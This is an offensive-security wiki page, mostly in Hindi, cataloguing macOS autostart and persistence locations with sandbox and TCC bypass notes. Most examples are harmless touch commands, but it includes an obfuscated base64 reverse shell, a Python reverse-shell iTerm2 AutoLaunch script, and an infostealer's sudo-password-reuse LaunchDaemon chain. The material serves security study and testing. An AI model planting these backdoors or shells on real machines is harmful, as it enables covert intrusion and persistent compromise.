# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

यह section [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) blog series पर काफी हद तक आधारित है। इसका goal **more Autostart Locations** जोड़ना (यदि संभव हो), यह बताना है कि macOS के latest version (13.4) में **which techniques are still working**, और आवश्यक **permissions** को specify करना है।

## Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिल सकती हैं, जो आपको केवल किसी चीज़ को **writing it into a file** द्वारा execute करने और किसी बहुत **common** **action**, निर्धारित **amount of time** या ऐसी **action you can usually perform** का इंतज़ार करने की अनुमति देती हैं, जिसे आप root permissions के बिना sandbox के अंदर से सामान्यतः perform कर सकते हैं।

### Launchd

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Root required
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Root required
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> एक रोचक तथ्य यह है कि **`launchd`** में Mach-o section `__Text.__config` के अंदर एक embedded property list होती है, जिसमें अन्य well known services शामिल होती हैं जिन्हें launchd को start करना आवश्यक होता है। इसके अतिरिक्त, इन services में `RequireSuccess`, `RequireRun` और `RebootOnSuccess` हो सकते हैं, जिसका अर्थ है कि उन्हें run होकर successfully complete होना आवश्यक है।
>
> Ofc, code signing के कारण इसे modify नहीं किया जा सकता।

#### Description & Exploitation

**`launchd`** startup के समय OX S kernel द्वारा execute किया जाने वाला पहला **process** और shut down के समय finish होने वाला आखिरी process है। इसका **PID 1** होना चाहिए। यह process इन स्थानों में मौजूद **ASEP** **plists** में indicated configurations को **read and execute** करेगा:

- `/Library/LaunchAgents`: admin द्वारा installed per-user agents
- `/Library/LaunchDaemons`: admin द्वारा installed system-wide daemons
- `/System/Library/LaunchAgents`: Apple द्वारा provided per-user agents।
- `/System/Library/LaunchDaemons`: Apple द्वारा provided system-wide daemons।

जब कोई user log in करता है, तो `/Users/$USER/Library/LaunchAgents` और `/Users/$USER/Library/LaunchDemons` में स्थित plists को **logged users permissions** के साथ start किया जाता है।

**agents और daemons के बीच मुख्य difference यह है कि agents user के log in करने पर load होते हैं, जबकि daemons system startup पर load होते हैं** (क्योंकि ssh जैसी services होती हैं जिन्हें किसी भी user के system access करने से पहले execute करना आवश्यक होता है)। इसके अलावा, agents GUI का उपयोग कर सकते हैं, जबकि daemons को background में run करना आवश्यक होता है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
ऐसे मामले होते हैं जहां किसी **agent को user के लॉग इन करने से पहले execute करना होता है**, इन्हें **PreLoginAgents** कहा जाता है। उदाहरण के लिए, यह login पर assistive technology प्रदान करने के लिए उपयोगी है। इन्हें `/Library/LaunchAgents` में भी पाया जा सकता है (उदाहरण के लिए [**यहां**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) देखें)।

> [!TIP]
> नए Daemons या Agents की config files **अगले reboot के बाद या** `launchctl load <target.plist>` का उपयोग करने पर **लोड** होंगी। `launchctl -F <file>` के साथ बिना उस extension वाली .plist files को **लोड करना भी संभव है** (हालांकि वे plist files reboot के बाद automatically load नहीं होंगी)।\
> `launchctl unload <target.plist>` के साथ **unload** करना भी संभव है (इससे संबंधित process terminate हो जाएगी),
>
> यह **सुनिश्चित करने के लिए** कि कोई भी चीज़ (जैसे कोई override) किसी **Agent** या **Daemon** को **run** होने से **नहीं रोक रही है**, चलाएं: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

वर्तमान user द्वारा लोड किए गए सभी agents और daemons की सूची बनाएं:
```bash
launchctl list
```
#### उदाहरण malicious LaunchDaemon chain (password reuse)

एक हालिया macOS infostealer ने एक **captured sudo password** का पुनः उपयोग करके एक user agent और root LaunchDaemon इंस्टॉल किया:

- agent loop को `~/.agent` में लिखें और उसे executable बनाएं।
- `/tmp/starter` में एक plist generate करें, जो उस agent की ओर point करे।
- चोरी हुए password का `sudo -S` के साथ पुनः उपयोग करके उसे `/Library/LaunchDaemons/com.finder.helper.plist` में copy करें, `root:wheel` सेट करें, और `launchctl load` के साथ load करें।
- output को detach करने के लिए `nohup ~/.agent >/dev/null 2>&1 &` के माध्यम से agent को silently start करें।
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> यदि कोई plist किसी user के स्वामित्व में है, भले ही वह daemon system wide folders में हो, **task को user के रूप में execute किया जाएगा** न कि root के रूप में। यह कुछ privilege escalation attacks को रोक सकता है।

#### launchd के बारे में अधिक जानकारी

**`launchd`** पहला **user mode process** है, जिसे **kernel** से start किया जाता है। Process का start होना **successful** होना चाहिए और यह **exit या crash नहीं कर सकता**। यह कुछ **killing signals** से भी **protected** है।

`launchd` द्वारा किए जाने वाले शुरुआती कार्यों में से एक सभी **daemons** को **start** करना है, जैसे:

- समय के आधार पर execute किए जाने वाले **Timer daemons**:
- atd (`com.apple.atrun.plist`): इसका `StartInterval` 30min है
- crond (`com.apple.systemstats.daily.plist`): इसमें 00:15 पर start होने के लिए `StartCalendarInterval` है
- **Network daemons** जैसे:
- `org.cups.cups-lpd`: TCP (`SockType: stream`) पर `SockServiceName: printer` के साथ listen करता है
- SockServiceName या तो कोई port होना चाहिए या `/etc/services` की कोई service
- `com.apple.xscertd.plist`: TCP port 1640 पर listen करता है
- निर्दिष्ट path में बदलाव होने पर execute किए जाने वाले **Path daemons**:
- `com.apple.postfix.master`: path `/etc/postfix/aliases` को check करता है
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices` entry में नाम `com.apple.xscertd.helper` दर्शाता है
- **UserEventAgent:**
- यह पिछले वाले से अलग है। यह विशेष event के response में launchd से apps spawn करवाता है। हालांकि, इस मामले में शामिल main binary `launchd` नहीं, बल्कि `/usr/libexec/UserEventAgent` है। यह SIP restricted folder /System/Library/UserEventPlugins/ से plugins load करता है, जहाँ प्रत्येक plugin `XPCEventModuleInitializer` key में अपना initialiser दर्शाता है या पुराने plugins के मामले में, अपने `Info.plist` के `CFPluginFactories` dict में key `FB86416D-6164-2070-726F-70735C216EC0` के अंतर्गत दर्शाता है।

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको ऐसा app ढूंढना होगा जिसमें TCC bypass हो और जो इन files को load करने वाला shell execute करे

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: zsh के साथ terminal open करें
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: zsh के साथ terminal open करें
- Root आवश्यक है
- **`~/.zlogout`**
- **Trigger**: zsh के साथ terminal से exit करें
- **`/etc/zlogout`**
- **Trigger**: zsh के साथ terminal से exit करें
- Root आवश्यक है
- संभावित रूप से और भी जानकारी: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bash के साथ terminal open करें
- `/etc/profile` (काम नहीं किया)
- `~/.profile` (काम नहीं किया)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xterm के साथ trigger होना अपेक्षित है, लेकिन यह **installed नहीं है** और install करने के बाद भी यह error आता है: xterm: `DISPLAY is not set`

#### Description & Exploitation

`zsh` या `bash` जैसे shell environment को initiate करते समय, **कुछ startup files run की जाती हैं**। macOS वर्तमान में default shell के रूप में `/bin/zsh` का उपयोग करता है। Terminal application launch होने पर या SSH के माध्यम से device access किए जाने पर यह shell automatically access होता है। हालांकि macOS में `bash` और `sh` भी मौजूद हैं, लेकिन उनका उपयोग करने के लिए उन्हें explicitly invoke करना पड़ता है।

zsh का man page, जिसे हम **`man zsh`** से पढ़ सकते हैं, startup files का लंबा description देता है।
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### दोबारा खोले गए Applications

> [!CAUTION]
> बताए गए exploitation को configure करने और log-out तथा log-in करने, या यहाँ तक कि reboot करने से भी मेरे लिए app execute नहीं हुआ। (App execute नहीं हो रहा था; शायद इन actions को perform करते समय उसका running होना आवश्यक है।)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: Restart पर applications को दोबारा खोलना

#### Description & Exploitation

दोबारा खोले जाने वाले सभी applications plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` के अंदर होते हैं।

इसलिए, दोबारा खोले जाने वाले applications से अपना app launch करवाने के लिए, आपको केवल **अपने app को list में add करना होगा**।

UUID को उस directory की listing करके या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` से पाया जा सकता है।

दोबारा खोले जाने वाले applications को check करने के लिए आप यह कर सकते हैं:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
इस सूची में **किसी application को जोड़ने के लिए** आप इसका उपयोग कर सकते हैं:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal का उपयोग user की FDA permissions प्राप्त करने के लिए करें

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal खोलें

#### Description & Exploitation

**`~/Library/Preferences`** में Applications में user की preferences store होती हैं। इनमें से कुछ preferences में **अन्य applications/scripts execute करने** का configuration हो सकता है।

उदाहरण के लिए, Terminal Startup में कोई command execute कर सकता है:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

यह config **`~/Library/Preferences/com.apple.Terminal.plist`** file में इस प्रकार reflected होता है:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
तो, यदि system में terminal की preferences की plist को overwrite किया जा सके, तो **`open`** functionality का उपयोग **terminal खोलने के लिए किया जा सकता है और वह command execute की जाएगी**।

आप इसे cli से इस तरह add कर सकते हैं:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- उपयोगकर्ता की FDA permissions प्राप्त करने के लिए Terminal का उपयोग करें

#### Location

- **कहीं भी**
- **Trigger**: Terminal खोलें

#### Description & Exploitation

यदि आप एक [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) बनाकर उसे खोलते हैं, तो **Terminal application** अपने-आप invoke होकर उसमें दिए गए commands को execute करेगा। यदि Terminal app के पास कुछ special privileges (जैसे TCC) हैं, तो आपका command उन्हीं special privileges के साथ run होगा।

इसे आज़माएँ:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
आप extensions **`.command`**, **`.tool`** का भी उपयोग कर सकते हैं, जिनमें regular shell scripts content हो, और वे भी Terminal द्वारा open हो जाएँगे।

> [!CAUTION]
> यदि Terminal के पास **Full Disk Access** है, तो वह उस action को पूरा कर सकेगा (ध्यान दें कि execute की गई command एक terminal window में दिखाई देगी)।

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- आपको कुछ अतिरिक्त TCC access मिल सकता है

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Root आवश्यक है
- **Trigger**: coreaudiod या computer को Restart करें
- **`/Library/Audio/Plug-ins/Components`**
- Root आवश्यक है
- **Trigger**: coreaudiod या computer को Restart करें
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod या computer को Restart करें
- **`/System/Library/Components`**
- Root आवश्यक है
- **Trigger**: coreaudiod या computer को Restart करें

#### Description

पिछले writeups के अनुसार **कुछ audio plugins compile** करना और उन्हें load करवाना संभव है।

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- आपको कुछ अतिरिक्त TCC access मिल सकता है

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins तब execute किए जा सकते हैं, जब आप **किसी file का preview trigger** करते हैं (Finder में file select करके space bar दबाते हैं) और उस file type को support करने वाला **plugin installed** हो।

अपना QuickLook plugin compile करना, उसे load करने के लिए पिछले locations में से किसी एक में रखना, और फिर किसी supported file पर जाकर उसे trigger करने के लिए space दबाना संभव है।

### ~~Login/Logout Hooks~~

> [!CAUTION]
> यह मेरे लिए काम नहीं किया, न user LoginHook के साथ और न ही root LogoutHook के साथ।

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- आपको `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` जैसी किसी चीज़ को execute करने में सक्षम होना चाहिए
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

ये deprecated हैं, लेकिन user के login करने पर commands execute करने के लिए उपयोग किए जा सकते हैं।
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
यह setting `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में stored है.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
इसे हटाने के लिए:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root user वाला यहाँ store किया जाता है: **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> यहाँ आपको **sandbox bypass** के लिए उपयोगी start locations मिल सकती हैं, जो आपको किसी file में कुछ **लिखकर** और specific **programs installed**, user के "uncommon" actions या environments जैसी **बहुत सामान्य न होने वाली conditions** की अपेक्षा करके कुछ execute करने की अनुमति देती हैं।

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- हालांकि, आपको `crontab` binary execute करने में सक्षम होना आवश्यक है
- या root होना आवश्यक है
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Direct write access के लिए root आवश्यक है। यदि आप `crontab <file>` execute कर सकते हैं, तो root आवश्यक नहीं है
- **Trigger**: cron job पर निर्भर करता है

#### Description & Exploitation

इससे **current user** के cron jobs की list प्राप्त करें:
```bash
crontab -l
```
आप **`/usr/lib/cron/tabs/`** और **`/var/at/tabs/`** में users के सभी cron jobs भी देख सकते हैं (root आवश्यक है)।

MacOS में **certain frequency** पर scripts execute करने वाले कई folders यहाँ पाए जा सकते हैं:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
वहां आपको नियमित **cron** **jobs**, **at** **jobs** (जिनका बहुत कम उपयोग होता है) और **periodic** **jobs** (मुख्य रूप से अस्थायी files को साफ करने के लिए उपयोग किए जाते हैं) मिलेंगे। दैनिक periodic jobs को उदाहरण के लिए इस तरह execute किया जा सकता है: `periodic daily`.

**user cronjob** को programmatically जोड़ने के लिए इसका उपयोग करना संभव है:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 के पास पहले से granted TCC permissions होती थीं

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: iTerm खोलें
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: iTerm खोलें
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: iTerm खोलें

#### Description & Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** में stored Scripts execute की जाएंगी। उदाहरण के लिए:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
या:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
स्क्रिप्ट **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** भी निष्पादित की जाएगी:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** में स्थित iTerm2 preferences, iTerm2 terminal खुलने पर **execute** किए जाने वाले command को **indicate** कर सकती हैं।

यह setting iTerm2 settings में configure की जा सकती है:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

और command preferences में reflected होती है:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
आप execute की जाने वाली command को इस प्रकार सेट कर सकते हैं:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences** का दुरुपयोग करके arbitrary commands execute करने के **अन्य तरीके** होने की अत्यधिक संभावना है।

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- sandbox को bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन xbar install होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Accessibility permissions का अनुरोध करता है

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: xbar execute होने पर

#### Description

यदि लोकप्रिय program [**xbar**](https://github.com/matryer/xbar) install है, तो **`~/Library/Application\ Support/xbar/plugins/`** में एक shell script लिखना संभव है, जिसे xbar start होने पर execute किया जाएगा:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन Hammerspoon इंस्टॉल होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Accessibility permissions का अनुरोध करता है

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: hammerspoon के execute होने पर एक बार

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) **macOS** के लिए एक automation platform के रूप में कार्य करता है, जो अपने operations के लिए **LUA scripting language** का उपयोग करता है। विशेष रूप से, यह complete AppleScript code के integration और shell scripts के execution को support करता है, जिससे इसकी scripting capabilities काफी बढ़ जाती हैं।

ऐप एक single file, `~/.hammerspoon/init.lua`, को खोजता है और शुरू होने पर script execute हो जाती है।
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन BetterTouchTool installed होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Automation-Shortcuts और Accessibility permissions का अनुरोध करता है

#### स्थान

- `~/Library/Application Support/BetterTouchTool/*`

यह tool कुछ shortcuts दबाए जाने पर execute करने के लिए applications या scripts निर्दिष्ट करने की अनुमति देता है। एक attacker database में अपना **shortcut और action to execute** configure करके arbitrary code execute करवा सकता है (shortcut केवल कोई key दबाने का हो सकता है)।

### Alfred

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन Alfred installed होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- यह Automation, Accessibility और यहां तक कि Full-Disk access permissions का अनुरोध करता है

#### स्थान

- `???`

यह ऐसे workflows बनाने की अनुमति देता है जो कुछ conditions पूरी होने पर code execute कर सकते हैं। संभावित रूप से attacker एक workflow file बना सकता है और Alfred से उसे load करवा सकता है (workflows का उपयोग करने के लिए premium version खरीदना आवश्यक है)।

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन ssh enabled और used होना चाहिए
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH को FDA access प्राप्त होता है

#### स्थान

- **`~/.ssh/rc`**
- **Trigger**: ssh के माध्यम से Login
- **`/etc/ssh/sshrc`**
- Root required
- **Trigger**: ssh के माध्यम से Login

> [!CAUTION]
> ssh को on करने के लिए Full Disk Access आवश्यक है:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### विवरण और Exploitation

By default, जब तक `/etc/ssh/sshd_config` में `PermitUserRC no` मौजूद न हो, user के **SSH के माध्यम से login करने** पर scripts **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** execute की जाएंगी।

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- sandbox bypass करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
- लेकिन आपको args के साथ `osascript` execute करना होगा
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- `osascript` को call करने वाला exploit payload stored है
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root required

#### विवरण

System Preferences -> Users & Groups -> **Login Items** में आप **user के login करने पर execute किए जाने वाले items** पा सकते हैं।\
Command line से इन्हें list करना, add करना और remove करना संभव है:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
ये items file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** में stored होते हैं।

**Login items** को API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) का उपयोग करके भी indicate किया जा सकता है, जो configuration को **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** में store करेगा।

### ZIP as Login Item

(Login Items के बारे में पिछला section देखें, यह उसका extension है)

यदि आप किसी **ZIP** file को **Login Item** के रूप में store करते हैं, तो **`Archive Utility`** उसे open करेगा। यदि zip को, उदाहरण के लिए, **`~/Library`** में store किया गया हो और उसमें backdoor वाली **`LaunchAgents/file.plist`** Folder मौजूद हो, तो वह folder create हो जाएगा (यह default रूप से मौजूद नहीं होता) और plist add कर दी जाएगी। इस तरह, अगली बार user के दोबारा login करने पर **plist में indicated backdoor execute होगा**।

एक अन्य option यह है कि user HOME के अंदर **`.bash_profile`** और **`.zshenv`** files create की जाएँ। इस तरह, यदि LaunchAgents folder पहले से मौजूद हो, तो भी यह technique काम करेगी।

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

